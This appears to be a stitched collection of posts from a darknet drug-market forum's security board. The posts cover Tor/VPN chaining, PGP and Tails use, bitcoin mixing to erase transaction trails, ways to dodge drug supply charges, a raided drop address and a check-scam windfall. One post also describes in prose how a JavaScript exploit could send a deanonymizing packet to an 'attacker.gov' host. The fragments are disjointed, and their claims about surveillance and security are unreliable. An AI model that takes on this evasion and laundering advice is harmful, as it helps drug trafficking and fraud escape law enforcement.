Not only is all call metadata, location info, and SMS data being collected, but full audio of all phone calls are also being collected (as revealed by The Intercept). Anything that has been or will be touted as an attempt by the federal government to limit their activities is purely cosmetic. Also, it's not just the NSA; much of this data is being made available to the other 3-letter agencies, and even local law enforcement, with explicit instructions to cover up the sources of information. Parallel construction is now standard procedure, and it will only become more widespread in the near future.  Any device connected to the internet (and even some that aren't) are vulnerable. Most if not all Apple products have known backdoors (their recent push for default encryption is a nice gesture, but more of a PR move than anything). Not sure about Android devices, but it's safe to assume they're compromised as well. Sadly, even the Blackphone isn't NSA-proof. It may protect you from the passive dragnet data collection, but if you're being specifically targeted you're screwed no matter what.  Fortunately, you're probably not nearly important enough to warrant any special attention.

Phones tend to have about 3 antenna's and the upper right or left will likely be the GPS/WIFI antenna. The GPS is really sensitive so you can easily disable it by opening the phone and placing a small sheet of paper to break the antenna connection from the circuitboard.

Basically if you are caught, charged and actually get to court, in order for you to be found gulity of supplying drugs the prosecution have to prove that you, the defendant, possessed drugs with the intent to supply them.  It matters not whether you have 1g or 1kg if they can't prove you intended to supply them then you will guilty of possession only. (it is difficult to get out of a possession charge by the way, you are either in possession or not in the eyes of the law, simple)  Obviously, the more you have,  the easier it will be for them to prove you were supplying.  But the amount won't be the only evidence.  E.G If you have 1g but split into 10bags of 0.1g, this could still be proven as supply.   But if you have 10g in one bag at the start of a festival weekend where you won't be leaving the site,  this could be possession.  Remember it is up to the prosecution (not you) to prove beyond reasonable doubt that you are guilty.  NEVER EVER admit to sharing your drugs, even letting your friend have a puff on your spliff....by the letter of the law this is supply and if they're after you, they'll use any piece of shit you say to get you.

The only advantage to using Tor over VPN is that if the FBI tries another Javascript hack they won't be able to pull your real IP from your Tor browser. They'll only get your VPN IP. That's a lot better than if they got your real IP.  If you're using VPN over Tor then if your VPN is ever compromised LE will never be able to get your real IP. I would only use this config if you're trying to do something truly mission critical and very high risk. It's impractical otherwise. Impractical and very slow.

","Discussion/Security"," Nobody, not even the NSA can see what you do on Tor unless they use a timing attack which is easier said than done by controlling both ends of your nodes, the entry node and the exit node and use correlation and number of packets dropped to identify you. But anyways, your ISP has nowhere near this capability.  And for those of you who say that your ISP can tell you are using Tor plain as day, this is not necessarily true unless they are using deep packet inspection, which usually does not happen unless they are purposely monitoring your traffic specifically.  Believe me, this is an expensive thing to do to monitor and capture every single packet and store it on record, and your ISP will not do this unless they are ordered to. The storage capacity required is astronomical.   What they CAN see plain as day, is that you are connecting to a Tor entry node. Since there is a directory of known Tor entry nodes, if you are regularly connecting to these nodes, it is obvious that you are using Tor, if they are aware of the entry nodes, then they can set an alert to notify them when people connect to these known nodes.   Back to the subject about them seeing what you do on Tor, this is virtually impossible due to the multiple levels of encryption used by Tor.   Tor is an onion router, which means each packet of of data is encrypted 3 times, and each node only has the key to decrypt 1 layer of the onion. The first layer, the outer layer is encrypted to your entry node, once your entry node decrypts this outer layer, it knows where to route the packet to, which is the second node, called the relay node. This relay node decrypts the second layer which also gives them the location of the final node, the exit node to route the packet to it's final destination before reaching the clearnet. Finally, the exit node will decrypt the data into plain text and send it off to the clearnet.  So even if the ISP was inspecting your packets and capturing everything, they would need to decrypt all 3 layers of the onion to see your data. Not possible for your ISP to do.  Now! If you are using a hidden service, then there are actually 6 hops (nodes) between your computer and the destination server (the hidden server .onion) in a MUCH MORE complicated method of routing which you can read about here.    https://www.torproject.org/docs/hidden-services.html.en  And the exit node does not decrypt your information, the hidden service does because when using hidden services, the actual hidden service itself becomes your exit node.

Still if you're not too keen on calling attention to yourself then you should use a VPN first and then connect to Tor. VPNs are much more common and don't raise nearly as much suspicion.

From the very start our system has several security mechanisms which monitor the current situation and try to lock access to both money and information in case any threat is detected. Some of you have experienced problems with this in the past as well, the system was reacting on more things than it should have been.  Lately the Transaction Malleability has been causing a lot of problems for many Bitcoin services. And even though our software could actually handle this, the ongoing DoS attack was more than enough to trigger the locking mechanism.  As a result we have had a number of transactions which were locked and encrypted wallets before they got a chance to be sent to the network. We had to decrypt and analyze those wallets first to make the transactions broadcast again. This is exactly what the system is supposed to do: block and freeze transactions if there is anything shady about them.  At this time all the issues are resolved and the system is actually adjusted in a way that malled transactions do not trigger it any longer.  However some trasnactions are still locked, we know this and working as fast as we can with the individual users to release those transactions. In the end all the money will be returned of course.  We apologize for all affected users.  There is no ""run"" of any kind, the users that have received their funds now can confirm this. But the sheer volume of requests we have received is so big that it takes time to through them all, since usually we don't get that many requests.        ",""

For example, when replying to a post, if you try to ""insert quote"" while already replying on the forums here (if you're already in the ""Post reply..."" box I mean), it won't work without javascript.  It just does nothing without even an error because javascript is disabled.  Little stuff like that uses javascript, and I don't know how an addon like NoScript (or any other addon) disables javascript, but personally I consider it best to go right to the source and disable it there.  Like I said, NoScript is itself a javascript program, and I always thought it was kind of weird that it tried to control javascript when that's what it is.  Anyway, I'm sure it works fine, but the first thing I do every time I upgrade my Tor browser is go to about:config and disable javascript.  That's all I meant.  It also isn't weird at all that it would be enabled in Tails, because frankly the web is pretty fucking boring and half broken if you disable javascript entirely.  It also doesn't even notify you if something requires javascript and is broken without it.  You just kind of have to assume ""oh, this must need javascript, because it's fucking broken!""

To add someone's public key to your key chain, you would have wanted to check that option in the services like before, specifically the ""OpenPGP: Import key"" option.  Then you would copy and paste the public key into TextEdit, highlight the whole key including the header and footer (the begin and end parts including the dashes), right-click > services > and choose ""OpenPGP: Import key.""  That will automatically bring whoever's public key into the Keychain app, without even having to open the app.  To get your public key, you would go into the ""GPG Keychain Access"" app, highlight they key you want to export, then click the export button at the top.  When the window pops up, make sure that ""Allow secret key export"" is NOT checked.  Choose where you want to save the ASCII file (desktop is fine/easy to locate) and make note of it's name or change it to whatever, click save.  Then right click that ascii file and ""open with"" > ""other"" > ""textedit.""  Then copy and paste that into your message or wherever.    Good luck!

"Silk Road 2 Forums","Nightcrawler","26958","2014-02-18T04:05:32","GPG4USB download offline?","Discussion/Security"," PLEASE DO NOT USE RICH TEXT FORMAT! -- rtf and HTML code in PGP messages cause nothing but headaches for the recipients. Messages with embedded markup frequently cause PGP clients to choke on them.    Here is a tutorial written by Guru, adapted by me:   GPGTools is highly version dependent -- depending on which version of OS X you have, it may or may not work as expected. If you have Leopard (10.5) then you're pretty much out of luck. Your only option then will be using the command-line.   If you have Snow Leopard (10.6), Lion (10.7) or Mountain Lion (10. , or Mavericks (10.9) the following instructions should be sufficient to allow you to get up and running.   Download and install GPGTools: https://releases.gpgtools.org/GPG%20Suite%20-%202013.10.22.dmg  Once you have installed GPGTools, what you want to do is to go into System Preferences --> Keyboard --> Services.  Scroll down until you find the following entries. Be sure to put a check mark in the boxes to activate each keyboard shortcut.   Keyboard shortcuts:  ==================  OpenPGP: Decrypt Selection: Shift-Command-D  OpenPGP: Encrypt Selection: Shift-Command-E  OpenPGP: Import Key from Selection: Shift-Command-I  OpenPGP: Insert My Fingerprint: Shift-Command-F  OpenPGP: Insert My Key: Shift-Command-K  OpenPGP: Sign Selection: Shift-Command-R  OpenPGP: Verify Signature of Selection: Shift-Control-V   Remember, these shortcuts only operate on highlighted or selected text. N.B.: To properly be able to import PGP keys into GPGChain (via TextEdit) you need to change the default on TextEdit from .rtf to plain text. You can do that through the Format menu, or you can go through the main configuration menu, accessible by using Command-comma. Ensure the plain text radio button is selected. Also ensure that the following are UNCHECKED in TextEdit preferences: smart quotes, smart dashes, smart links.   To select text within TextEdit, use Command-A to highlight the entire document, or use your mouse to selection the section that you want to verify/sign/encrypt/decrypt. It is highly recommended that you use only plain-text, as opposed to Rich Text (.rtf) format. Use Command-comma to bring up Preferences and ensure that the plain text radio button is checked.   Once your text is highlighted in TextEdit, (by pressing Comand-A) you then encrypt using Shift-Command-E. You will then be presented with a list of keys to encrypt to, that you have added to your PGP keyring:   Other Commands You May Need: ============================  OpenPGP: Decrypt File: Control-Command-D  OpenPGP: Encrypt File: Control-Command-E  OpenPGP: Sign File: Control-Command-S  OpenPGP: Verify Signature of File: Control-Command-V   Once you have setup these shortcuts, you can begin using GPG.   To encrypt a message to someone using GPG, you first need a copy of the recipient's PGP public key.   Once you have located someone's PGP public key, you should copy and paste it into TextEdit. Save the PGP key to a file; you can call the file, import.asc (or import.txt), for example. This saved file will usually be found in the Documents folder.   Launch GPG Keychain Access from the Applications folder. click on the Import icon in the upper left hand corner. GPG Keychain Access will then prompt you for the name of the file which contains the key to import. It will usually show you a list of files in the Documents folder. Click on the file named import.asc (or import.txt), and click ok. The PGP public key will then be imported into your PGP keyring.   To encrypt a message to a person, the message must be contained in a TextEdit document. Use Command-A to hightlight the entire document. Then use Shift-Command-E to encrypt. GPG will pop-up a list of public keys in your PGP keyring. Each key will have a little checkbox beside it which you can check, to select that particular key. If you were encrypting a message to me, you would put a check in the box beside my PGP key (Nightcrawler@SR).   When you click on OK, the plaintext (unencrypted) message in TextEdit will be replaced with the encrypted message. You can then copy and paste the encrypted message to enter it into a form on Silk Road, or anywhere else that it needs to go.   To decrypt a message sent to you by other people, you need to copy that message to the clipboard, and paste it into a TextEdit document. Again use Command-A to highlight all the encrypted message. Then use Shift-Command-D to decrypt the message. If the message is encrypted to your PGP public key, you will be prompted to enter your passphrase. Once the correct passphrase has been entered, and you click OK, then the message will be decrypted, and the decrypted text will be placed in the TextEdit document, replacing the encrypted message that was there previously.

"Silk Road 2 Forums","BootiusMaximus","50850","2014-09-06T16:41:48","Updating tails","Discussion/Security"," Thanks naughtybits for the info. I received the alert about the update, but was somewhat concerned at first thinking it might be some type of scam. The update directs you to Tails official website to learn more about the newest version of Tails released. I decided against just clicking the upgrade now button, and tried to manually update as usual. After having some trouble when downloading the .iso image, I decided to upgrade through the alert provided. As you said, it all took place in the background, then asked me to restart once it finished. I did, and checked to see what versions of TOR and TAILS I am running now, it states it's version 1.1.1, and TOR message log says I am currently running TOR version ""0.2.4.23"" I believe all this is accurate and up to date.","While there actually is extensive documentation available to anyone on https://tails.boum.org as well as within the Tails software itself, it can still be a bit confusing if you're new to it. Recently, with some of the upgrades the developers have used a mechanism that would automatically alert the user about the update being available. After the user confirms wanting to update, the whole process of downloading, verification of checksums and signatures takes place in the background.While being easy to do, auto-updating may sometimes not work as expected and you would need to get the whole .iso again.

"Silk Road 2 Forums","naughtybits","50850","2014-09-13T10:34:23","Updating tails","Discussion/Security","Here is a very basic explanation: You need cryptographic verification methods to make sure your tails.iso was not corrupted during download. Essentially it is a way to make sure that Tails will probably work correctly, before actually using it. When you download a new ""tails.iso"" image from the official Tails website, you will also find the option to download a signature file ""tails.iso.sig"".  You don't have to do it, but it is better to be safe than sorry    What you first need to do is import the official tails-signing.key.  Now you can check if the tails.iso you downloaded is ok to use and was not corrupted in any way during download.  You do this using the cryptographic signature ""tails.iso.sig"".  A basic example of this would be:  ""gpg --verify tails.iso.sig tails.iso"" using the command line. The output will show either ""Good Signature"" or ""Bad Signature"".   There are several alternative methods which are easier to do for those unfamiliar with the command line. I strongly recommend you read the official documentation.

I would definitely recommend Tails over any Windows based approach for obvious reasons.  There have been documented cases of people being deanonymized and subsequently arrested after the FBI used a vulnerability in the TorBrowserBundle, which explicitly affected Windows users.  Tails is no magical solution for absolute safety and anonymity while using hidden services. But in considering the level of security it offers while being relatively easy to use, I'd recommend it to anyone.  I'd recommend reading through all the tutorials on the forums as well.

By Bitblender:  ::: Best-Practice for Top-Level Anonymity :::  As a standalone tool, Bitcoin Blender provides a very good level of anonymity for erasing your transaction trail. However, as with anything, you can always take extra precautions to ensure your anonymity remains top-notch and offers the greatest protection possible. As well as using Bitcoin Blender, we recommend the following:  1. Deposit to Multiple Addresses By making multiple deposits of different amounts to different deposit addresses over a period of time you are further improving your anonymity.  2. Delay Your Withdrawals If somebody is watching the Blockchain, and they notice a transaction for 100btc at 4:30, followed by another transaction of 98btc at 5:00, they might suspect this is a part of the same trail - even if there is no hardcore evidence. By waiting several hours, days or even weeks, you are further distancing yourself from association with the coins you wish to mix.  3. Withdraw to Multiple Addresses By the same token, if you deposit 100btc and withdraw 98btc to a single address, this may give somebody watching the Blockchain reason to suspect it is part of the same trail. By making multiple withdrawals to different addresses generated by different wallets over a long period of time, you are further improving your anonymity.  4. Mix Multiple Times If you want to really make your trail as difficult to follow as possible, and there is another service you trust you could mix your coins several times.  5. Mix In, Mix Out Your 'buy in' and 'buy out' are the most vulnerable parts of your transaction trail, as they are the most likely points that you will be identified. If you do not wish your transactions to be followed, mix all coins you buy before you spend them, then mix anything you withdraw again on their way back out.","Im on bitblender and it says Min delay and Max delay.I normally use 1 hour min and max because i don't like waiting long for my money.I know that the longer the better, but is 1 hour enough just so it makes it hard to trace back?"

Not including any clearnet links, if you feel like finding out more I'm sure you can locate a news source..  This all smells of, do as I say not as I do..  From arstechnica: NBC News has published new documents from the National Security Agency trove provided by former NSA contractor Edward Snowden. The latest revelation is that British intelligence agency GCHQ conducted a covert campaign against Anonymous in September of 2011, crippling one operation by the hacktivist group and unmasking several of its members. The slides indicate that the GCHQ infiltrated the Internet relay chat (IRC) for Operation Payback, a collective âopâ by hackers affiliated with Anonymous that targeted PayPal, MasterCard, and Visa after they stopped electronic donations to WikiLeaks.  The irony of the efforts is that the GCHQ operative used almost precisely the same sort of techniques and methods that hackers who have often aligned themselves with Anonymous employ. The GCHQ employed a covert informant to conduct the campaign, and the informant used social engineering, denial-of-service attacks, and malware against the targets.  Itâs not clear if thereâs a connection between the GHCQâs âCHISâ (covert human intelligence source) and the FBIâs turning of Hector âSabuâ Monsegur in June of 2011. But the timing of the GCHQ's operation against the Anonymous IRC corresponds to the time frame during which Sabu became a government informant.  Hacking the hackers  The PowerPoint slides show IRC logs between two individuals: âGzero,â later identified as a now-25-year-old English hacker named redacted and âp0ke,â a hacker who ironically may have been a co-author of Anonymousâ guide for IRC anonymity. Redacted was arrested and is serving a two-year prison sentence; p0keâs identity (which has been redacted from the slides) was exposed, along with his Facebook and e-mail account data. In both cases, the GCHQâs covert informant used IRC conversations about the targetsâ efforts to gain access to identity data to steer the targets into traps that had been laid for them.  A hacker working with Gzero, whose username has been redacted, came onto the #OperationPayback IRC channel looking for a webpage with high traffic. The hacker's intent was to use the page in order to launch a browser exploit package against visitors that would install a SpyEye botnet and other malware on their PCs.   Enlarge / A GCHQ slide reveals the details mined by a covert informant chatting with ""Gzero."" The GCHQ informant said he had administrative access to a porn site that fit the bill, and Gzero later contacted him in private chat to discuss a dealâpointing the informant at the server running the exploit package. WHOIS data for the server was used to identify Gzero, and he was later convicted for stealing over 200,000 PayPal accounts, 2,700 credit card numbers, and the personally identifying information of over eight million British residents.  The informant also jumped into a conversation with p0ke when the hacker bragged to LulzSecâs Topiary (later identified as redacted), âI has list of email:phonenumber:name of 700 FBI tards.â p0ke claimed the data was from a table called âFBIâ in a database from a US Department of Agriculture website. The informant then got p0ke into a private chat and posted a Web link that redirected to a BBC story on hacktivism. This link also captured data about p0keâs virtual private network provider, and the GCHQ was subsequently able to use that to identify p0ke and share his information with law enforcement.   Enlarge / Anon p0ke takes the bait, gets doxxed. DDoSing the DDoSers  The GCHQ claimed to take Anonymous IRC offline for over a day using a distributed denial-of-service (DDoS) attack against its network, apparently using a SYN floodâbombarding the networkâs servers with bogus partial TCP-IP connections to use up network resources. (A similar attack was used against Ars last year after we reported on the âswattingâ of security reporter Brian Krebs.)  In the summer of 2011âaround the time of Sabuâs arrest and conversion to informantâthe GCHQ was involved in coordinated effort with law enforcement to identify âtop targetsâ within Anonymous, perform âInformation opsâ using the confidential informant, and go after the collectiveâs infrastructure. The DDoS attack by the GCHQ, called âROLLING THUNDERâ in the agencyâs slide deck, was used in a trial run in early September. The attack took the server irc.anonops.li offline, and it may have affected any âhivemindâ denial-of-service attacks launched using Anonymousâ denial-of-service tools.  The details of the âinformation opsâ against Anonymous during the campaign, which was called Operation WEALTH, arenât clear from the slides. However, the GCHQ apparently used the confidential informant to message individuals active in the IRC with information aimed at ending their involvement with the organization. The GCHQ slide deck reported, â80 percent of those messaged where [sic] not in the IRC channels one month later.â  Edited to redact names in compliance with no doxxing so the mods wouldnt have to   though I left sabu's name there because everyone knows he's a snitch bitch.",""

Contact PayPal and arrange to pay in installments, a date or anything but if you leave it in their hands they will eventually destroy your credit rating and I can only imagine a PayPal debt collector would reflect really badly for many years. Not to mention, they'll get the money out of you eventually if not more so you may as-well suck it up and tell them you made a mistake, will be unable to make payments at the moment and would like to work something out.   I know this from experience, I was in debt to PayPal for about three months and they never handed my details to a debt collector. They're a huge company and they have entire departments to deal with people such as yourself, they really don't mind about you owing them money provided you can promise them they'll get it back. To be honest, I put my PayPal account into negative balance long before I put my bank account into negative balance. Treat them with some respect, they won't fuck you.

But at the end of the day it would be no less secure than Gmail. Just always use tor, disable javascript, flash and java. You should be good to go.   Not sure what the problem is here?","New site on clearnet deepdotweb.com could be a problem, saw this on reddit http://www.reddit.com/r/DeepDotWeb/comments/1wkhtw/is_deepdotweb_a_honeypot/;Why? First, DeepDotWeb tells you that their referral links are needed to register at Tor and I2P marketplaces which is just not true. Looks like they are trying to link your IP to registrations at marketplaces. Second, DeepDotWeb is also riddled with social network and Google trackers according to RequestPolicy and Ghostery. If you visit this site you should use Tor or a VPN and have addons installed in your browser to block trackers. Take care and stay safe. "

There's a reason there are controlled deliveries.

I won't reveal my country at the moment at risk of incrimination. And like I said, he just admitted he was waiting for a parcel which he genuinely was. He's not the smartest guy around but they came with a warrrant for two drugs that he never has had much at all to do with so he knew he had done nothing wrong.

He has a VERY good lawyer at the moment so he's been told to shut his fucking mouth   Thanks for the input though!  flux101 - No idea. It was a large amount of substance and they had no arrest warrant, just a search. They didn't arrest him, just convinced him to come in for questioning then used typical filthy techniques to make him incriminate himself. I do have a copy of the warrant that I can show (of course it will be heavily censored to protect everyone involved's identity, but I could put a timestamp in the picture) in case there was any doubt that I'm telling the truth.   The real problem here is the vendor legitimately seems like a great guy and I feel bad that this whole situation happened. The last thing I want is to prematurely out him, making potential customers fear for security when ordering from him, then he comes back with a perfectly reasonable reason to take so long and then BAM - I'm the asshole, and I've also ruined any chance I had of a refund in that situation.  On the other hand, if he is pulling a scam I don't want anyone else to lose anything. I'm keeping a close eye on his feedback and if it does start to go downhill I'll be dropping his name to protect other buyers, but I really hope it doesnt come to that. I'll point him towards this thread so he can see where I'm coming from - I don't want to look like I'm threatening or blackmailing him (""Send me the coins or I'll tell the world!!!""), I just want what was promised and I feel would be fair. I just need to get some funds to keep this guy out of jail as that big buy was nearly the last of my funds!  Thanks for the input all, I'll give him until the weekend",""

"Silk Road 2 Forums","Baspring","18885","2014-01-23T12:43:51","Vendor got my drop address raided - should I out him?","Discussion/Security"," The house was clean (never had another order other than a few that made it through as tests) and if the vendor is under investigation, wouldn't that be a pretty fucking good reason for people to stop ordering from him, if his packages are being tracked???  Honestly IMO the only (well, most likely by a LONG shot) explanation for this is that the vendor made a slip-up with packaging. I don't think he went out of his way to scam, but maybe a bit of residue got on the outside of the package? Maybe it didn't seal properly? Could have had a bit of shit stuck in the heat strip from the sealer, may not have heated the MBB enough. It happens. Maybe unlucky that it got sniffed out by a dog, but proper packaging means a dog shouldn't be able to sniff it out. I have pointed this thread out to him, and if he does stick to his word and refund the money then I will be happy that he is fair and I'm not going to give his name - but if he does give me a ""run-a-round"" and I'm down X amount of money from his mistake, however understandable it may be, I think ""name and shame"" is the only choice I have?","Quote from: Hiniguel on January 22, 2014, 01:15:34 pmYou better make sure that it was the vendors fault then before you fuck up his business (way of putting food on the table) exactly. and as Hiniguel stated there are any number of other reasons why your spot got raided. you or the vendor could be under investigation for one. and that's just one of many possibilities. but to make such assumptions and flat out blame the vendor or their stealth for being the reason your spot got raided, without any evidence to back it up, and without considering any number of other possibilities that could have been the cause, would be a premature assumption.and before you 'out' the vendor by name, perhaps 'ask' them to come to this thread and defend him/herself first? many vendors don't like to spend time on the forums (with good reason). but this might be one of those tines they may feel obligated to do so in order to straighten out the facts. even if you can't get a reply from them via PM now, perhaps stressing to him/her that you are feeling the need to out them publicly 'first', might compel them to join the discussion on their own accord. or even straighten the matter out with you privately.peacemirage"

I have tried a few about:config setting in firefox to no avail.  I have also tried to use the portable version that comes in Tor bundle (disabling the socks proxy that normally connects to Vidalia) but it does not connect at all so I am assuming there are some deeper changes that need to be made on the Tor Bundle firefox to make it work without vidalia.  Any suggestions would be greatly appreciated.  ",""

Normally harmless Javascript on a website you basically trust (like this forum) gets replaced with malicious Javascript containing an exploit that attacks your platform (Let's say it's Tails, so it's a Linux+Torbrowser exploit).   This happened to every site hosted at FreedomHosting in '13 when the FBI busted it, without many of the site admins even knowing it. 2. The exploit runs on your machine.  With Tails, it'd need to get root-level access, so it'd be a second, local root exploit for Linux.  Those aren't uncommon. 3. The exploit sends a packet back to attacker.gov directly from the network interface, not via Tor.  With Tails, the exploit would need to bring the iptables firewall down to do this, but that's just a couple more lines of code in the attack payload. 4. attacker.gov receives the packet.  It contains all the hardware info on your machine, including the builtin MAC address of the adapter, and the packet comes from your true network address, not through Tor.  Could also include a token they sent with the payload that uniquely identfies you as the specific person they sent that exploit to. (i.e. we sent forum user 'goldy' a token value of '12345678', so when we see the packet come back with 12345678 in it, we know it was goldy at this address, on this hardware, etc).  Before somebody screams, ""But Tails is magic!"", I'll say that the 2013 Torsploit/FreedomHosting exploit could easily have targetted/exploited Tails instead of Windows.  Same thing can happen to non-HTTPS sites you visit over Tor (not onions, but say you're going to http://www.slashdot.org/) if the exit node you happen to go out over Tor is malicious.  If you were going via HTTPS, they couldn't inject the content into the page they return without causing HTTPS errors.  Disabling Javascript massively decreases the attack surface of a machine.. it doesn't make you invulnerable,  but it's such a huge difference that you'd be a fool to turn it on just to get colors.  ","Can someone explane to me just how having Javascript  enabled makes it unsafe and and is it still unsafe if you are using tails with the hard-drive removed .                                                    thanks guys"

You can read an independent review of mixing services here - https://www.wi.uni-muenster.de/sites/default/files/public/department/itsecurity/mbc13/mbc13-moeser-paper.pdfI was looking at Electrum and the only thing that worried me is that it seems to connect to the bitcoin n/w and function even if I have Tor disconnected (after I've set it up to use the Tor proxy of course).  While with bitcoin-qt if Tor is off it doesn't connect.  Of course Electrum is easier as you don't have to download and keep the whole blockchain up to date, but I prefer b-qt as it seems to respect the proxy settings."

I am basically in the middle of a very elaborate check scam.  I was contacted for an online interview for a work from home position paying very handsomely.  I went through the interview process just to entertain myself and see what would come of it.  To no surprise I was hired by this individual representing an actual company( I have contacted the company, but received no reply as of yet), and was told that I would be receiving funds for the purchase of materials.  The storyline sounded somewhat legitimate until the individual asked for my bank login credentials    Obviously they were not getting that, so I told them send me a check and I will start working.  The individual kept up the business persona, and to my surprise I received a rather large check in the mail two days later.  Ok so now I'm still intrigued about this scam, I'm suppose to buy materials from a vendor that they will refer me to, ok, I'll keep playing this game.    The check clears, I contact the individual, half hoping that their next message will sound more legitimate than the previous ones.  I was disappointed.  The ""vendor"" in question is another person that I am suppose to send most of the funds to through two different money gram locations.  Now road, this is an obvious scam and I am not interested in being someone's tool for fraudulent practices.  I'll admit it's a very nice scam and I wish I could pull it off myself.  At the moment I am doing my research on the business and these types of scams, but I am clearly not going to send any money anywhere.  So what do you guys and gals think?    What should be my next move?  What Legal action can be taken against me if I decide to keep this cash and tell the individual to fuck off?  Can I pretend that I have busted them and that I am going to the authorities?  What can they do as retaliation?  Any advise or insight on this would be very helpful, need answers in the next couple hours.  I will continue to do my research on this.  Thanks",""

"Silk Road 2 Forums","Nightcrawler","26683","2014-02-17T18:34:07","Best Anonymous email?","Discussion/Security"," I could not disagree with you more. Let me explain why, from a posting that I made in another thread:     No kidding.  The fact that ""safe-mail"" has become the email provider of  choice on Silk Road is a disaster in the making. I am reminded of nothing  so much as the role Hushmail played in 2007, with the DEA's Operation Raw  Deal (ORD).  In ORD, Hush provided the DEA with ""one stop shopping"" as it  were, as all the suspects were using Hushmail. Buyers, sellers, sources of  supply (SOSes) all conveniently gathered in one place -- it was a fucking  turkey shoot!  The DEA boasted of having obtained in excess of 100,000  decrypted emails from Hush. Even as late as 2012 -- some 5 years later --  I was still hearing of busts taking place from the Hushmail data haul.   Sometime later this year, I think we're going to see history repeat itself,  only this time, instead of Hushmail, it'll be Safe-Mail. Recent events will  only make this more likely -- let me explain:   When SR1 went down, there was a frantic scramble on the part of buyers to  locate vendor contact information, primarily email addresses. With the most  recent events here on SR, we're seeing some people say, ""Fuck Markets!"" and  vowing to conduct business over email. The loss of BMR and its Forum, and  Utopia and its Forum will only exacerbate matters. As hacks and/or thefts  proliferate, people are becoming leery of centralized marketplaces, so they  are turning, in ever greater numbers, to older, alternative methods like  email. Once again, the provider of choice seems to be Safe-Mail.   Accordingly, I suspect over the next few months, that there will be some  changes to Safe-Mail's operations: we'll start seeing Tor exit nodes  blocked, and perhaps even bridges. No doubt the Feds will put a bug in the  ear of the Safe-Mail operators. Also, without a doubt, the carrot and the  stick will be employed -- the carrot will be some type of financial  incentive, and the stick will be the threat of prosecution, or some other  type of governmental pressure (perhaps an audit?) for non-compliance.   So, as a result, when enough users are using Safe-Mail, then the operators  suddenly make it difficult, if not impossible, to connect via Tor, meaning  that the only way to connect will be directly (or via VPN) both of which  mean that the user can be located/identified.   Religious use of PGP will blunt this threat somewhat, but not completely.  If you can be located/identified, then you can be raided, and forced to  give up your PGP secret key and passphrase. Case in point: Ross Ulbricht.  You can bet that every encrypted message he ever received has now been  decrypted, and is in the hands of the Feds.   It's going to be an interesting year.

VPN's are good for certain things (downloading torrents, as a proxy for overseas services not locally available to you, etc) but their use with Tor is a debatable topic  which has supporters on both sides of the argument. It's best to assume that all VPN's keep logs, even if they state they don't, just to keep your guard up and mind on the job. Some users may get complacent in the belief their true I.P addresses are not being logged when using the VPN service when in fact they were. You best bet is to set up your own trusted entry guards that you know aren't compromised to access Tor. Run your own Tor relay/s and use them as your entry guard/s.","Quote from: blubb on August 04, 2014, 06:33:42 pmNo but i was active in a fraud forum 5 years ago, and cyberghost was well known there to never use a cc with cg I believe i remember they even stated on their site that they log.this is utter bullshitthey say on their site that they do not logive never heard of a case of someone being busted useing themthey accept bitcoinany smart person would assume that any vpn could be loging and therefore sign up with a vpn through tor paying by bitcoinso why would it even matter if they log when they dont know who you are?"

"Silk Road 2 Forums","yerbamate","4146","2013-11-22T20:26:49","Meet the Spies Doing the NSA's Dirty Work [Article]","Discussion/Security","http://www.foreignpolicy.com/articles/2013/11/21/the_obscure_fbi_team_that_does_the_nsa_dirty_work  After reading the article it seems to me that Ross was most likely pwned by this special FBI DITU Unit.    ","With every fresh leak, the world learns more about the U.S. National Security Agency's massive and controversial surveillance apparatus. Lost in the commotion has been the story of the NSA's indispensable partner in its global spying operations: an obscure, clandestine unit of the Federal Bureau of Investigation that, even for a surveillance agency, keeps a low profile.When the media and members of Congress say the NSA spies on Americans, what they really mean is that the FBI helps the NSA do it, providing a technical and legal infrastructure that permits the NSA, which by law collects foreign intelligence, to operate on U.S. soil. It's the FBI, a domestic U.S. law enforcement agency, that collects digital information from at least nine American technology companies as part of the NSA's Prism system. It was the FBI that petitioned the Foreign Intelligence Surveillance Court to order Verizon Business Network Services, one of the United States' biggest telecom carriers for corporations, to hand over the call records of millions of its customers to the NSA.But the FBI is no mere errand boy for the United States' biggest intelligence agency. It carries out its own signals intelligence operations and is trying to collect huge amounts of email and Internet data from U.S. companies -- an operation that the NSA once conducted, was reprimanded for, and says it abandoned.The heart of the FBI's signals intelligence activities is an obscure organization called the Data Intercept Technology Unit, or DITU (pronounced DEE-too). The handful of news articles that mentioned it prior to revelations of NSA surveillance this summer did so mostly in passing. It has barely been discussed in congressional testimony. An NSA PowerPoint presentation given to journalists by former NSA contractor Edward Snowden hints at DITU's pivotal role in the NSA's Prism system -- it appears as a nondescript box on a flowchart showing how the NSA ""task"" information to be collected, which is then gathered and delivered by the DITU.But interviews with current and former law enforcement officials, as well as technology industry representatives, reveal that the unit is the FBI's equivalent of the National Security Agency and the primary liaison between the spy agency and many of America's most important technology companies, including Google, Facebook, YouTube, and Apple.The DITU is located in a sprawling compound at Marine Corps Base Quantico in Virginia, home of the FBI's training academy and the bureau's Operational Technology Division, which runs all the FBI's technical intelligence collection, processing, and reporting. Its motto: ""Vigilance Through Technology."" The DITU is responsible for intercepting telephone calls and emails of terrorists and foreign intelligence targets inside the United States. According to a senior Justice Department official, the NSA could not do its job without the DITU's help. The unit works closely with the ""big three"" U.S. telecommunications companies -- AT&T, Verizon, and Sprint -- to ensure its ability to intercept the telephone and Internet communications of its domestic targets, as well as the NSA's ability to intercept electronic communications transiting through the United States on fiber-optic cables.For Prism, the DITU maintains the surveillance equipment that captures what the NSA wants from U.S. technology companies, including archived emails, chat-room sessions, social media posts, and Internet phone calls. The unit then transmits that information to the NSA, where it's routed into other parts of the agency for analysis and used in reports.After Prism was disclosed in the Washington Post and the Guardian, some technology company executives claimed they knew nothing about a collection program run by the NSA. And that may have been true. The companies would likely have interacted only with officials from the DITU and others in the FBI and the Justice Department, said sources who have worked with the unit to implement surveillance orders.""The DITU is the main interface with providers on the national security side,"" said a technology industry representative who has worked with the unit on many occasions. It ensures that phone companies as well as Internet service and email providers are complying with surveillance law and delivering the information that the government has demanded and in the format that it wants. And if companies aren't complying or are experiencing technical difficulties, they can expect a visit from the DITU's technical experts to address the problem.Recently, the DITU has helped construct data-filtering software that the FBI wants telecom carriers and Internet service providers to install on their networks so that the government can collect large volumes of data about emails and Internet traffic.The software, known as a port reader, makes copies of emails as they flow through a network. Then, in practically an instant, the port reader dissects them, removing only the metadata that has been approved by a court.The FBI has built metadata collection systems before. In the late 1990s, it deployed the Carnivore system, which the DITU helped manage, to pull header information out of emails. But the FBI today is after much more than just traditional metadata -- who sent a message and who received it. The FBI wants as many as 13 individual fields of information, according to the industry representative. The data include the route a message took over a network, Internet protocol addresses, and port numbers, which are used to handle different kinds of 